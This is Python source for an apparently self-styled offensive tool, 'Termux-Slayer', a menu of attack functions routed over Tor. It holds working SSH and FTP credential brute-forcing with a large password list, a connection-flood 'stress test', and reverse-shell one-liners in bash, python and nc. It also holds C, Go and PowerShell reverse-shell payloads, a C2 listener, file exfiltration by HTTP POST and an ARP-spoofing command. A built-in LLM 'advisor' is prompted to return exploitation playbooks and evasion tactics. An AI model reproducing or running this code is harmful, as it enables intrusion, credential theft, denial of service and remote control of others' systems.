#!/usr/bin/env python3
import os
import sys
import time
import socket
import threading
import subprocess
import requests
import re
import shutil
import signal
import json
import hashlib
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    paramiko = None
    HAS_PARAMIKO = False
import ftplib
import termios
import tty
import select
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from rich.console import Console
from rich.align import Align
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from pyfiglet import Figlet

# Termux-Slayer v1.0: THE ULTIMATE NEURAL WEAPON
# Engineered by PhonkAlphabet - Zero Dependency / Full Autonomy
# ⚡️👾 by🇭🇷PhonkAlphabet 👾⚡️

init(autoreset=True)
console = Console()

class SlayerConfig:
    VERSION = "1.0.0"
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    LOG_FILE = os.path.join(BASE_DIR, "slayer_ops.log")
    STATE_FILE = os.path.join(BASE_DIR, "slayer_state.json")
    DEFAULT_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
    TOR_PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    PRIMARY_MODEL = "mistral-small-latest"
    FALLBACK_MODEL = "mistral-small-latest"
    API_ENDPOINT = "https://api.mistral.ai/v1/chat/completions"
    # API keys loaded from environment or user-supplied via API <key> command
    # Set GROQ_API_KEY or MISTRAL_API_KEY before launching for auto-ignition
    PRIMARY_KEY = (os.environ.get("GROQ_API_KEY") or os.environ.get("MISTRAL_API_KEY") or "")
    FALLBACK_KEY = os.environ.get("FALLBACK_API_KEY", "")
    
    COMMAND_LIST = {
        "API": "Ignite internal keys.",
        "API <key>": "Add your own AI key.",
        "TOR [ON/OFF]": "Toggle anonymous routing.",
        "AI <demand>": "Direct neural execution.",
        "SCAN <target>": "Deep vector port scan.",
        "RECON <domain>": "Attack surface mapping.",
        "BRUTE <tgt> <svc>": "Credential exhaustion.",
        "FUZZ <url>": "Web directory discovery.",
        "AUTO <target>": "Full-spectrum automation.",
        "SNIFF": "Local network host discovery.",
        "OSINT <target>": "Intelligence harvesting.",
        "WEB <url>": "Web vulnerability analysis.",
        "GEO <ip>": "Physical location mapping.",
        "DOS <tgt> <port>": "Service stress testing.",
        "HASH <string>": "Cryptographic identification.",
        "SHELL <ip> <pt>": "Reverse shell generation.",
        "LISTEN <port>": "C2 multi-handler listener.",
        "PAYLOAD <typ>": "Stealth factory output.",
        "CLOUD <target>": "Cloud bucket hunting.",
        "SPOOF <t> <g>": "Network manipulation.",
        "EXFIL <tgt> <f>": "Encrypted data tunnel.",
        "CONSULT": "Batch intel analysis.",
        "VANISH": "Purge operational traces.",
        "HELP": "Display tactical manual.",
        "EXIT": "Terminate neural link."
    }
    
    # Global 2026 Credential Wordlist (Harvested from GitHub/SecLists)
    USERS = list(set([
        "root", "admin", "administrator", "user", "guest", "support", "sysadmin", "oracle", "mysql", "postgres", 
        "ubuntu", "pi", "test", "service", "backup", "dev", "api", "webmaster", "staff", "manager", "security",
        "sqladmin", "mssql_svc", "db_admin", "oracle_admin", "ftpuser", "sshuser", "deploy", "jenkins", "docker",
        "ansible", "terraform", "kubernetes", "k8s", "grafana", "prometheus", "elastic", "kibana", "splunk",
        "gitlab", "github", "bitbucket", "jira", "confluence", "slack", "discord", "zoom", "teams", "office365",
        "azure", "aws", "gcp", "cloudadmin", "saas_admin", "it_support", "helpdesk", "noc", "soc", "audit",
        "operator", "maintainer", "contributor", "lead", "director", "vp", "ceo", "cto", "ciso", "owner",
        "app", "db", "web", "mail", "dns", "proxy", "vpn", "firewall", "router", "switch", "iot", "camera",
        "info", "adm", "ftp", "puppet", "ec2-user", "vagrant", "azureuser"
    ]))
    PASSWORDS = list(set([
        "123456", "password", "12345678", "12345", "admin", "root", "qwerty", "123456789", "1234", "111111",
        "password123", "admin123", "welcome", "login", "pass", "secret", "master", "access", "default", "system",
        "oracle", "mysql", "postgres", "ubuntu", "raspberry", "test1234", "letmein", "changeme", "nopassword",
        "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "696969", "shadow", "666666",
        "p@ssword", "admin@123", "Pass1234", "Welcome1", "Login123", "Secret123", "Access2026", "System2026",
        "Spring2026", "Summer2026", "Autumn2026", "Winter2026", "Password2026", "Admin2026", "Root2026",
        "!@#$%^&*", "qwertyuiop", "asdfghjkl", "zxcvbnm", "1q2w3e4r", "000000", "999999", "888888", "777777",
        "1234567890", "password!", "admin!", "root!", "guest!", "user!", "test!", "login!", "pass!", "secret!",
        "access!", "default!", "system!", "master!", "welcome!", "changeme!", "letmein!", "nopassword!",
        "P@ssw0rd123", "Admin@2026", "Root@2026", "User@2026", "Guest@2026", "Test@2026", "Login@2026",
        "Pass@2026", "Secret@2026", "Access@2026", "System@2026", "Master@2026", "Welcome@2026", "Change@2026",
        "LetMeIn@2026", "NoPass@2026", "Slayer2026", "Neural2026", "Omega2026", "Alpha2026", "Beta2026",
        "Delta2026", "Gamma2026", "Zeta2026", "Sigma2026", "Epsilon2026", "Theta2026", "Iota2026", "Kappa2026",
        "Lambda2026", "Mu2026", "Nu2026", "Xi2026", "Omicron2026", "Pi2026", "Rho2026", "Tau2026", "Upsilon2026",
        "Phi2026", "Chi2026", "Psi2026", "Omega!", "Slayer!", "Neural!", "Omega#", "Slayer#", "Neural#",
        "1234567890!", "qwertyuiop!", "asdfghjkl!", "zxcvbnm!", "1q2w3e4r!", "000000!", "999999!", "888888!",
        "pussy", "mustang", "michael", "jennifer", "2000", "jordan", "superman", "harley", "fuckme", "hunter",
        "fuckyou", "trustno1", "ranger", "buster", "thomas", "tigger", "robert", "soccer", "fuck", "batman",
        "killer", "hockey", "george", "charlie", "andrew", "michelle", "love", "sunshine", "jessica", "asshole",
        "6969", "pepper", "daniel", "654321", "joshua", "maggie", "starwars", "silver", "william", "dallas",
        "yankees", "ashley", "hello", "amanda", "orange", "biteme", "freedom", "computer", "sexy", "thunder",
        "nicole", "ginger", "heather", "hammer", "summer", "corvette", "taylor", "fucker", "austin", "1111",
        "merlin", "matthew", "121212", "golfer", "cheese", "princess", "martin", "chelsea", "patrick", "richard",
        "diamond", "yellow", "bigdog", "asdfgh", "sparky", "cowboy", "camaro", "anthony", "matrix", "falcon",
        "iloveyou", "bailey", "guitar", "jackson", "purple", "scooter", "phoenix", "aaaaaa", "morgan", "tigers",
        "porsche", "mickey", "maverick", "cookie", "nascar", "peanut", "justin", "131313", "money", "horny",
        "samantha", "panties", "steelers", "joseph", "snoopy", "boomer", "whatever", "iceman", "smokey",
        "gateway", "dakota", "cowboys", "eagles", "chicken", "dick", "black", "zxcvbn", "please", "andrea",
        "ferrari", "knight", "hardcore", "melissa", "compaq", "coffee", "booboo", "bitch", "johnny", "bulldog",
        "xxxxxx", "james", "player", "ncc1701", "wizard", "scooby", "charles", "junior", "internet", "bigdick",
        "mike", "brandy", "tennis", "blowjob", "banana", "monster", "spider", "lakers", "miller", "rabbit",
        "enter", "mercedes", "brandon", "steven", "fender", "john", "yamaha", "diablo", "chris", "boston",
        "tiger", "marine", "chicago", "rangers", "gandalf", "bigtits", "barney", "edward", "raiders", "porn",
        "badboy", "blowme", "spanky", "bigdaddy", "johnson"
    ]))
    
    FUZZ_LIST = list(set([
        "admin", "login", "config", "setup", "api", "v1", "v2", "backup", "old", "dev", "test", "secret", "private", "upload", "shell", "cmd", "db", "sql", "phpmyadmin", "wp-admin", "robots.txt", ".env", ".git", ".htaccess",
        "cgi-bin", "images", "scripts", "css", "js", "inc", "includes", "tmp", "temp", "cache", "logs", "data", "files", "upload", "downloads", "pub", "public", "src", "dist", "build", "vendor", "node_modules",
        "wp-content", "wp-includes", "wp-config.php", "xmlrpc.php", "readme.html", "license.txt", "index.php", "index.html", "home.php", "main.php", "app.php", "api.php", "v1/api", "v2/api", "rest", "graphql",
        "admin/login", "admin/config", "admin/setup", "admin/db", "admin/sql", "admin/phpmyadmin", "admin/wp-admin", "admin/upload", "admin/shell", "admin/cmd", "admin/backup", "admin/old", "admin/dev", "admin/test",
        "user", "users", "account", "accounts", "profile", "profiles", "member", "members", "client", "clients", "customer", "customers", "staff", "employee", "employees", "manager", "managers", "admin", "admins",
        "auth", "login", "logout", "register", "signup", "signin", "signout", "password", "pwd", "forgot", "reset", "verify", "confirm", "token", "session", "cookie", "cookies", "oauth", "saml", "jwt",
        "search", "query", "find", "list", "view", "show", "get", "post", "put", "delete", "update", "edit", "create", "add", "remove", "delete", "clear", "reset", "save", "load", "import", "export",
        "mail", "email", "smtp", "pop3", "imap", "webmail", "roundcube", "squirrelmail", "horde", "outlook", "exchange", "office365", "gmail", "yahoo", "hotmail", "aol", "icloud", "protonmail", "tutanota",
        "dns", "ns", "mx", "txt", "soa", "ptr", "cname", "srv", "aaaa", "spf", "dkim", "dmarc", "zone", "transfer", "axfr", "bind", "powerdns", "unbound", "knot", "nsd", "coredns",
        "ftp", "sftp", "ssh", "telnet", "rlogin", "rsh", "rsync", "scp", "vnc", "rdp", "smb", "nfs", "iscsi", "snmp", "ldap", "radius", "tacacs", "kerberos", "ntp", "syslog",
        "mysql", "mariadb", "postgresql", "sqlite", "mongodb", "redis", "memcached", "cassandra", "elasticsearch", "influxdb", "prometheus", "grafana", "kibana", "splunk", "graylog", "logstash",
        "docker", "kubernetes", "k8s", "helm", "terraform", "ansible", "puppet", "chef", "salt", "vagrant", "jenkins", "gitlab", "github", "bitbucket", "jira", "confluence", "slack", "discord",
        "aws", "azure", "gcp", "digitalocean", "linode", "vultr", "heroku", "netlify", "vercel", "cloudflare", "akamai", "fastly", "sucuri", "incapsula", "imperva", "f5", "citrix",
        "vpn", "openvpn", "wireguard", "ipsec", "l2tp", "pptp", "sstp", "ikev2", "anyconnect", "forticlient", "paloalto", "checkpoint", "sonicwall", "sophos", "barracuda",
        "camera", "cctv", "dvr", "nvr", "ipcam", "webcam", "iot", "smart", "home", "automation", "gateway", "router", "switch", "firewall", "ap", "wifi", "modem", "printer", "scanner",
        "backup.sql", "db.sql", "database.sql", "dump.sql", "backup.tar.gz", "backup.zip", "config.json", "config.yml", "config.yaml", "settings.py", "local_settings.py", ".env.example", ".env.local", ".env.dev", ".env.prod",
        "shell.php", "cmd.php", "eval.php", "exec.php", "system.php", "passthru.php", "shell.jsp", "cmd.jsp", "shell.aspx", "cmd.aspx", "shell.py", "cmd.py", "shell.pl", "cmd.pl", "shell.sh", "cmd.sh"
    ]))

class StateManager:
    def __init__(self):
        self.state = {"target": None, "history": [], "buffer": [], "keys": {}}
        self.load()

    def load(self):
        if os.path.exists(SlayerConfig.STATE_FILE):
            try:
                with open(SlayerConfig.STATE_FILE, 'r') as f:
                    self.state.update(json.load(f))
            except: pass

    def save(self):
        try:
            with open(SlayerConfig.STATE_FILE, 'w') as f:
                json.dump(self.state, f)
        except: pass

    def update(self, key, value):
        self.state[key] = value
        self.save()

class TorManager:
    def __init__(self, ui):
        self.ui = ui
        self.active = False
        self.current_ip = "Checking..."

    def get_ip(self):
        try:
            session = self.get_session()
            resp = session.get("https://api.ipify.org", timeout=5)
            self.current_ip = resp.text
        except: self.current_ip = "UNKNOWN"
        return self.current_ip

    def toggle(self, state=None):
        if state is None: self.active = not self.active
        else: self.active = state == "ON"
        if self.active:
            self.ui.add_log("Initiating TOR Circuit...", "INFO")
            try:
                subprocess.run(["pgrep", "tor"], check=True, capture_output=True)
                self.ui.add_log("TOR Circuit Established.", "SUCCESS")
            except:
                self.ui.add_log("TOR not running. Install: pkg install tor && tor &", "WARN")
        else:
            self.ui.add_log("TOR Circuit Disabled.", "INFO")

    def get_session(self):
        s = requests.Session()
        if self.active: s.proxies.update(SlayerConfig.TOR_PROXY)
        return s

class OffensiveSuite:
    def __init__(self, ui, tor, cortex):
        self.ui = ui
        self.tor = tor
        self.cortex = cortex
        self.stop_event = threading.Event()

    def stop_all(self):
        self.stop_event.set()
        self.ui.add_log("All operations halted.", "CRITICAL")
        # Reset for next run
        threading.Timer(1.0, self.stop_event.clear).start()

    def scan(self, target):
        self.ui.active_tasks += 1
        try:
            open_ports = []
            self.ui.add_log(f"Scanning {target}...", "INFO")
            def check(port):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1.5)
                        r = s.connect_ex((target, port))
                        if r == 0: open_ports.append(port)
                except: pass
            with ThreadPoolExecutor(max_workers=30) as ex:
                ex.map(check, SlayerConfig.DEFAULT_PORTS)
            if open_ports:
                self.ui.add_log(f"Open Ports: {', '.join(map(str, sorted(open_ports)))}", "SUCCESS")
                self.cortex.trigger_feedback(f"Open ports on {target}: {open_ports}")
            else: self.ui.add_log("No open ports found.", "WARN")
        finally: self.ui.active_tasks -= 1

    def brute(self, t, s):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Credential Exhaustion on {t}:{s}...", "WARN")
            u = SlayerConfig.USERS[:20]  # Slice for demo
            p = SlayerConfig.PASSWORDS[:200]
            found = False
            self.ui.add_log(f"Vector: {s.upper()} Bruteforce Initialized", "INFO")
            self.ui.add_log(f"Users: {len(u)}, Passwords: {len(p)}", "INFO")
            for user in u:
                for pwd in p:
                    if self.stop_event.is_set(): return
                    try:
                        if s.lower() == "ssh":
                            if not HAS_PARAMIKO:
                                self.ui.add_log(f"SSH bruteforce unavailable: install 'python-paramiko' via pkg (Termux) or 'paramiko' via pip", "ERROR")
                                break
                            c = paramiko.SSHClient()
                            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            c.connect(t, username=user, password=pwd, timeout=5)
                            self.ui.add_log(f"CREDENTIALS FOUND: {user}:{pwd}", "CRITICAL")
                            self.cortex.trigger_feedback(f"SSH credentials discovered: {user}:{pwd} on {t}")
                            found = True
                            c.close()
                            break
                        elif s.lower() == "ftp":
                            f = ftplib.FTP(t)
                            f.login(user, pwd)
                            self.ui.add_log(f"CREDENTIALS FOUND: {user}:{pwd}", "CRITICAL")
                            self.cortex.trigger_feedback(f"FTP credentials discovered: {user}:{pwd} on {t}")
                            found = True
                            f.quit()
                            break
                    except: pass
                if found: break
            if not found: self.ui.add_log("No credentials found in sample set.", "WARN")
        finally: self.ui.active_tasks -= 1

    def fuzz(self, target):
        self.ui.active_tasks += 1
        try:
            target = target.rstrip('/')
            self.ui.add_log(f"Web Directory Discovery on {target}", "INFO")
            found_dirs = []
            total = len(SlayerConfig.FUZZ_LIST)
            session = self.tor.get_session()
            for idx, path in enumerate(SlayerConfig.FUZZ_LIST):
                if self.stop_event.is_set(): return
                if idx % 20 == 0 and idx > 0:
                    self.ui.add_log(f"Fuzzing progress: {idx}/{total}...", "INFO")
                try:
                    url = f"{target}/{path}"
                    r = session.get(url, timeout=3)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        self.ui.add_log(f"[{r.status_code}] {url}", "SUCCESS")
                        found_dirs.append((r.status_code, url))
                except: pass
            if found_dirs:
                self.ui.add_log(f"Discovered {len(found_dirs)} directories.", "SUCCESS")
                self.cortex.trigger_feedback(f"FUZZ on {target}: {found_dirs}")
        finally: self.ui.active_tasks -= 1

    def auto(self, target):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Full-Spectrum Automation: {target}", "CRITICAL")
            # Daemon threads run these concurrently without blocking the UI
            threading.Thread(target=self.scan, args=(target,), daemon=True).start()
            threading.Thread(target=self.osint, args=(target,), daemon=True).start()
            threading.Thread(target=self.cloud, args=(target,), daemon=True).start()
            threading.Thread(target=self.fuzz, args=(f"http://{target}",), daemon=True).start()
            self.ui.add_log("AUTO: scan+osint+cloud+fuzz launched concurrently.", "SUCCESS")
        finally: self.ui.active_tasks -= 1

    def recon(self, target):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Attack Surface Mapping: {target}", "INFO")
            try:
                ip = socket.gethostbyname(target)
                self.ui.add_log(f"Resolved IP: {ip}", "SUCCESS")
                self.cortex.trigger_feedback(f"Recon on {target}: IP={ip}")
            except:
                self.ui.add_log("DNS resolution failed.", "WARN")
            # Concurrent subdomain thoughts
            subs = ["www", "mail", "admin", "dev", "api", "vpn", "ftp", "intranet", "docs", "status", "blog"]
            found = []
            for s in subs:
                if self.stop_event.is_set(): return
                try:
                    sub_ip = socket.gethostbyname(f"{s}.{target}")
                    found.append(f"{s}.{target}")
                    self.ui.add_log(f"Subdomain: {s}.{target} -> {sub_ip}", "SUCCESS")
                except: pass
            if found:
                self.cortex.trigger_feedback(f"Recon on {target}: Subdomains {found}")
        finally: self.ui.active_tasks -= 1

    def sniff(self):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log("Local Network Host Discovery...", "INFO")
            self.ui.add_log("Sniffing requires root or dedicated scanner.", "WARN")
            self.ui.add_log("Tip: Use SCAN <ip> for targeted port scans.", "INFO")
        finally: self.ui.active_tasks -= 1

    def geo(self, ip):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Geolocating: {ip}", "INFO")
            session = self.tor.get_session()
            resp = session.get(f"https://ipapi.co/{ip}/json/", timeout=10)
            if resp.status_code == 200:
                d = resp.json()
                self.ui.add_log(f"ISP: {d.get('org','N/A')} | Region: {d.get('region','N/A')} | Country: {d.get('country_name','N/A')}", "SUCCESS")
                self.cortex.trigger_feedback(f"GEO: {ip} -> {d}")
            else: self.ui.add_log("Geo lookup failed.", "WARN")
        except: self.ui.add_log("Geo Error", "CRITICAL")
        finally: self.ui.active_tasks -= 1

    def dos(self, target, port):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Service Stress Test on {target}:{port}", "WARN")
            sent = 0
            start = time.time()
            while time.time() - start < 10:
                if self.stop_event.is_set(): return
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        s.connect((target, int(port)))
                        s.send(b"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
                        sent += 1
                except: pass
            self.ui.add_log(f"Stress test complete. {sent} packets sent in 10s.", "INFO")
        finally: self.ui.active_tasks -= 1

    def web_scan(self, url):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Web Vulnerability Analysis: {url}", "INFO")
            session = self.tor.get_session()
            try:
                r = session.get(url, timeout=10)
                hdrs = r.headers
                srv = hdrs.get('Server', 'Unknown')
                tech = hdrs.get('X-Powered-By', 'Unknown')
                self.ui.add_log(f"Server: {srv} | Tech: {tech}", "INFO")
                # Quick SQLi check on URL params
                if '?' in url:
                    test_url = url + "'"
                    resp = session.get(test_url, timeout=5)
                    if any(err in resp.text.lower() for err in ['sql', 'mysql', 'syntax', 'unclosed']):
                        self.ui.add_log("SQLi Possible: Syntax error detected.", "CRITICAL")
                        self.cortex.trigger_feedback(f"SQLi detected on {url}")
                # Check for common headers
                if 'X-Frame-Options' not in hdrs:
                    self.ui.add_log("Missing X-Frame-Options (Clickjacking risk).", "WARN")
                if 'Content-Security-Policy' not in hdrs:
                    self.ui.add_log("Missing Content-Security-Policy.", "WARN")
            except: self.ui.add_log("Web scan failed.", "WARN")
        finally: self.ui.active_tasks -= 1

    def hash_id(self, h):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Hash Identification: {h}", "INFO")
            patterns = {
                "MD5": (32, r'^[a-f0-9]{32}$'),
                "SHA1": (40, r'^[a-f0-9]{40}$'),
                "SHA256": (64, r'^[a-f0-9]{64}$'),
                "SHA512": (128, r'^[a-f0-9]{128}$'),
                "NTLM": (32, r'^[a-f0-9]{32}$'),
            }
            for name, (length, pat) in patterns.items():
                if len(h) == length and re.match(pat, h):
                    self.ui.add_log(f"Likely {name}", "SUCCESS")
                    self.cortex.trigger_feedback(f"Hash identified as {name}: {h}")
                    break
            else:
                self.ui.add_log("Hash type unknown.", "WARN")
        finally: self.ui.active_tasks -= 1

    def gen_shell(self, ip, port):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Reverse Shell Generator: {ip}:{port}", "INFO")
            shells = {
                "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "python3": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
                "nc": f"nc -e /bin/bash {ip} {port}",
            }
            for name, cmd in shells.items():
                self.ui.add_log(f"[{name}] {cmd}", "CRITICAL")
            self.cortex.trigger_feedback(f"Reverse shell payload generated for {ip}:{port}")
        finally: self.ui.active_tasks -= 1

    def exfil(self, target, file_path):
        if not os.path.exists(file_path):
            self.ui.add_log(f"File not found: {file_path}", "CRITICAL")
            return
        self.ui.add_log(f"Exfiltrating {file_path} to {target}", "INFO")
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            requests.post(f"http://{target}/exfil", data=data, timeout=10)
            self.ui.add_log("Exfiltration sequence complete.", "SUCCESS")
        except Exception as e:
            self.ui.add_log(f"Exfiltration failed: {e}", "CRITICAL")

    def listen(self, port):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"C2 Listener active on port {port}...", "SUCCESS")
            self.ui.add_log("Waiting for incoming connections. Press ESC to stop.", "INFO")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', int(port)))
                s.listen(5)
                s.settimeout(1.0)
                while not self.stop_event.is_set():
                    try:
                        conn, addr = s.accept()
                        self.ui.add_log(f"Inbound Connection: {addr[0]}", "CRITICAL")
                        self.cortex.trigger_feedback(f"Reverse shell connection established from {addr[0]}")
                        def handle_conn(c, a):
                            try:
                                with c:
                                    c.send(b"Slayer C2 Active\n> ")
                                    while not self.stop_event.is_set():
                                        rlist, _, _ = select.select([c], [], [], 0.5)
                                        if rlist:
                                            data = c.recv(4096)
                                            if not data: break
                                            self.ui.add_log(f"C2 Data from {a[0]}: {data.decode(errors='ignore')[:100]}", "INFO")
                                    self.ui.add_log(f"Connection from {a[0]} closed.", "INFO")
                            except: pass
                        threading.Thread(target=handle_conn, args=(conn, addr), daemon=True).start()
                    except socket.timeout:
                        continue
        except Exception as e: self.ui.add_log(f"Listener Error: {e}", "CRITICAL")
        finally: self.ui.active_tasks -= 1

    def osint(self, target):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Harvesting Intelligence: {target}", "INFO")
            intel = {}
            try:
                import dns.resolver
                for rtype in ['A', 'MX', 'NS', 'TXT']:
                    try:
                        ans = dns.resolver.resolve(target, rtype)
                        intel[rtype] = [str(r) for r in ans]
                    except: pass
            except ImportError:
                self.ui.add_log("dnspython not installed. DNS queries skipped. Install: pip install dnspython", "WARN")
            try:
                resp = requests.get(f"https://rdap.org/domain/{target}", timeout=5).json()
                intel['whois'] = resp.get('entities', [])
            except: pass
            self.ui.add_log(f"Intelligence Harvested: {len(intel)} vectors.", "SUCCESS")
            self.cortex.trigger_feedback(f"OSINT Data for {target}: {intel}")
            return intel
        finally: self.ui.active_tasks -= 1

    def payload(self, ptype, lhost, lport):
        self.ui.add_log(f"Generating Stealth {ptype.upper()} Payload...", "INFO")
        if ptype.lower() == "c":
            p = f'#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main() {{ int s = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in a; a.sin_family = AF_INET; a.sin_port = htons({lport}); a.sin_addr.s_addr = inet_addr("{lhost}"); connect(s, (struct sockaddr *)&a, sizeof(a)); dup2(s, 0); dup2(s, 1); dup2(s, 2); execve("/bin/sh", NULL, NULL); return 0; }}'
        elif ptype.lower() == "go":
            p = f'package main; import ("net"; "os/exec"; "syscall"); func main() {{ c, _ := net.Dial("tcp", "{lhost}:{lport}"); cmd := exec.Command("/bin/sh"); cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c; cmd.SysProcAttr = &syscall.SysProcAttr{{Setsid: true}}; cmd.Run() }}'
        else:
            p = f'$c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sy = ([text.encoding]::ASCII).GetBytes($sb+"PS " + (pwd).Path + "> ");$s.Write($sy,0,$sy.Length);$s.Flush()}};$c.Close()'
        
        self.ui.add_log(f"Stealth {ptype.upper()} Factory Output:", "SUCCESS")
        self.ui.add_log(p, "CRITICAL")
        self.cortex.trigger_feedback(f"Advanced {ptype} payload generated for {lhost}:{lport}")

    def cloud(self, target):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"Hunting Cloud Assets: {target}", "INFO")
            buckets = [target, f"{target}-backup", f"{target}-dev", f"{target}-prod", f"{target}-data"]
            found = []
            for b in buckets:
                s3_url = f"http://{b}.s3.amazonaws.com"
                try:
                    r = requests.get(s3_url, timeout=3)
                    if r.status_code == 200:
                        self.ui.add_log(f"Exposed S3 Bucket: {s3_url}", "CRITICAL")
                        found.append(s3_url)
                except: pass
                az_url = f"https://{b}.blob.core.windows.net"
                try:
                    r = requests.get(az_url, timeout=3)
                    if r.status_code == 200:
                        self.ui.add_log(f"Exposed Azure Blob: {az_url}", "CRITICAL")
                        found.append(az_url)
                except: pass
            return found
        finally: self.ui.active_tasks -= 1

    def spoof(self, target, gateway):
        self.ui.active_tasks += 1
        try:
            self.ui.add_log(f"SPOOF requires Scapy for active ARP poisoning.", "INFO")
            self.ui.add_log(f"Target: {target} | Gateway: {gateway}", "INFO")
            self.ui.add_log("To run this manually with scapy:", "INFO")
            spoof_cmd = f"sudo python3 -c \"import scapy.all as sc; sc.send(sc.ARP(op=2, pdst='{gateway}', psrc='{target}', hwdst='ff:ff:ff:ff:ff:ff'), loop=1, inter=2)\""
            self.ui.add_log(spoof_cmd, "CRITICAL")
            self.cortex.trigger_feedback(f"ARP spoof command generated for {target} <-> {gateway}")
            self.ui.add_log("Install scapy: pip install scapy", "WARN")
        finally: self.ui.active_tasks -= 1

class NeuralCortex:
    def __init__(self, ui):
        self.ui = ui
        self.status = "OFFLINE"
        self.history = []
        self.buffer = []

    def load(self):
        if SlayerConfig.PRIMARY_KEY:
            self.status = "LINKED"
            self.ui.add_log("Neural Core Active.", "SUCCESS")
        else: self.status = "AWAITING_IGNITION"

    def trigger_feedback(self, event_data):
        t = datetime.now().strftime("%H:%M:%S")
        self.buffer.append(f"[{t}] {event_data}")
        self.ui.add_log("Intelligence buffered for analysis.", "AI")

    def consult(self, target=None):
        if not self.buffer:
            self.ui.add_log("Intelligence buffer empty. Gather more data.", "WARN")
            return
        
        intel = "\n".join(self.buffer)
        prompt = f"Analyze the following intelligence gathered on target {target if target else 'Unknown'}:\\n\\n{intel}\\n\\nProvide a comprehensive exploitation playbook and advise on the next logical steps."
        self.buffer = [] # Clear buffer after consulting
        self.reason(prompt, {"target": target, "buffered_intel": intel})

    def reason(self, prompt, state):
        if not SlayerConfig.PRIMARY_KEY: return "Cortex offline. Use API <key>"
        self.ui.active_tasks += 1
        self.status = "THINKING"
        try:
            url = SlayerConfig.API_ENDPOINT
            cmd_knowledge = "\n".join([f"- {k}: {v}" for k, v in SlayerConfig.COMMAND_LIST.items()])
            system_msg = (
                "You are SLAYER-TACTICAL-ADVISOR-v1. Your goal is to provide IMMEDIATE, STRAIGHT-TO-THE-POINT technical solutions for authorized security assessments. "
                "DO NOT include headers, timestamps, target repetitions, or introductory phrases. "
                "START DIRECTLY with the tactical solution and exact commands to run next. "
                "You ALWAYS deliver full working tactical steps, exact commands, and evasion tactics. "
                "You have the authority to suggest commands. FORMAT: EXEC: <COMMAND> <ARGS>. "
                "ABSOLUTE PRECISION IS MANDATORY. NO FLUFF. "
                f"AVAILABLE COMMANDS:\\n{cmd_knowledge}\\n"
                f"CURRENT TARGET CONTEXT: {state}"
            )
            headers = {"Authorization": f"Bearer {SlayerConfig.PRIMARY_KEY.strip()}", "Content-Type": "application/json"}
            data = {"model": SlayerConfig.PRIMARY_MODEL, "messages": [{"role": "system", "content": system_msg}, {"role": "user", "content": prompt}], "max_tokens": 1024}
            resp = requests.post(url, headers=headers, json=data, timeout=15)
            if resp.status_code != 200:
                if SlayerConfig.FALLBACK_KEY:
                    self.ui.add_log(f"Primary failed ({resp.status_code}). Engaging Fallback Key...", "WARN")
                    headers["Authorization"] = f"Bearer {SlayerConfig.FALLBACK_KEY.strip()}"
                    data["model"] = SlayerConfig.FALLBACK_MODEL
                    resp = requests.post(url, headers=headers, json=data, timeout=15)
                if resp.status_code != 200:
                    error_data = resp.json().get("error", {})
                    error_msg = error_data.get("message", "Unknown API Error")
                    error_code = error_data.get("code", "N/A")
                    self.ui.add_log(f"Neural Core Error: {error_msg} (Code: {error_code})", "CRITICAL")
                    self.status = "ERROR"
                    return f"Error: {error_msg}"
            res_json = resp.json()
            if "choices" not in res_json:
                self.ui.add_log(f"Neural Core Error: Invalid response format", "CRITICAL")
                self.status = "ERROR"
                return "Error: Invalid response format"
            res = res_json["choices"][0]["message"]["content"].strip()
            if "EXEC:" in res:
                cmd_to_exec = res.split("EXEC:")[1].split("\n")[0].strip()
                self.ui.add_log(f"AI suggests: {cmd_to_exec}", "AI")
                self.ui.add_log("Type the command above to execute. Auto-exec disabled for safety.", "WARN")
            self.history.append((prompt, res))
            self.status = "LINKED"
            self.ui.render()
            return res
        except Exception as e:
            self.status = "ERROR"
            self.ui.add_log(f"Neural Error: {e}", "CRITICAL")
            return f"Error: {e}"
        finally:
            self.ui.active_tasks -= 1

class TermuxSlayerApp:
    def __init__(self):
        self.state = StateManager()
